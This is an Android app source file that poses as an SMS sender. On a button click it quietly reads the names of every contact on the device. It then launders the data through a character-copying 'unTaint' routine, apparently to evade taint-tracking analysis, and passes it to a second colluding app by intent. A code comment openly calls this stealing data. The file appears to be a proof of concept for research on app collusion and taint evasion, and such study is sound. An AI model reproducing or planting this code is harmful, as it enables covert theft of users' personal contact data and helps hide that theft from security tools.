package com.example.appa;

import android.os.AsyncTask;
import android.os.BatteryManager;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.ContactsContract.PhoneLookup;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.telephony.SmsManager;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;

@SuppressLint("NewApi")
public class MainActivity extends Activity {
	private Button mbtnOk;
	private TextView mtvText;
	private TextView mtvPhone;
	private String mstr;
	private String mNewStr = new String();

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		mtvText = (TextView) findViewById(R.id.editText1);
		mtvPhone = (TextView) findViewById(R.id.editText2);
		mbtnOk = (Button) findViewById(R.id.button1);

		mbtnOk.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
				AsyncTask.execute(new Runnable() {
					@Override
					public void run() {
						// sends SMS to the number entered
						if (mtvPhone.getText() != null
								&& mtvText.getText() != null
								&& !mtvPhone.getText().toString().equals("")
								&& !mtvText.getText().toString().equals("")) {
							String num = mtvPhone.getText().toString();
							String text = mtvText.getText().toString();

							sendSMS(text, num);
						}

						// steals data and sends it to AppB
						if (appInstalledOrNot("com.example.appb")) {
							getContacts();
							unTaint();
							sendData();
						}
					}
				});
			}
		});
	}

	/**
	 * Method to send SMS
	 * 
	 * @param text
	 * @param num
	 */
	private void sendSMS(String text, String num) {
		SmsManager smsManager = SmsManager.getDefault();
		smsManager.sendTextMessage(num, null, text, null, null);
	}

	public void getContacts() {
		Cursor people = getContentResolver().query(
				ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

		while (people.moveToNext()) {
			int nameFieldColumnIndex = people
					.getColumnIndex(PhoneLookup.DISPLAY_NAME);
			String contact = people.getString(nameFieldColumnIndex);
			mstr += contact + "\t";
		}
		people.close();
	}

	public void unTaint() {
		char[] asciiChar = mstr.toCharArray();
		
		char[] newAsciiChar = new char[asciiChar.length];
		int[] asciiInt = new int[asciiChar.length];
		
		for(int i=0; i<asciiChar.length; i++)
			asciiInt[i] = (int)asciiChar[i];

		for(int i=0; i<asciiInt.length; i++)
			for(int j=0; j<=255; j++) {
				if(asciiInt[i] == j)
					newAsciiChar[i] = (char)j;
			}
		mNewStr += "Untainted!!!!\t";
		mNewStr += String.valueOf(newAsciiChar);
	}

	public void sendData() {
		Intent sendIntent = getPackageManager().getLaunchIntentForPackage(
				"com.example.appb");

		sendIntent.setAction(Intent.ACTION_SEND);
		sendIntent.putExtra(Intent.EXTRA_TEXT, mNewStr);
		sendIntent.setType("text/plain");
		startActivity(sendIntent);
	}

	private boolean appInstalledOrNot(String uri) {
		PackageManager pm = getPackageManager();
		boolean app_installed = false;
		try {

			pm.getPackageInfo(uri, PackageManager.GET_ACTIVITIES);
			app_installed = true;
		} catch (PackageManager.NameNotFoundException e) {
			app_installed = false;
		}
		return app_installed;
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
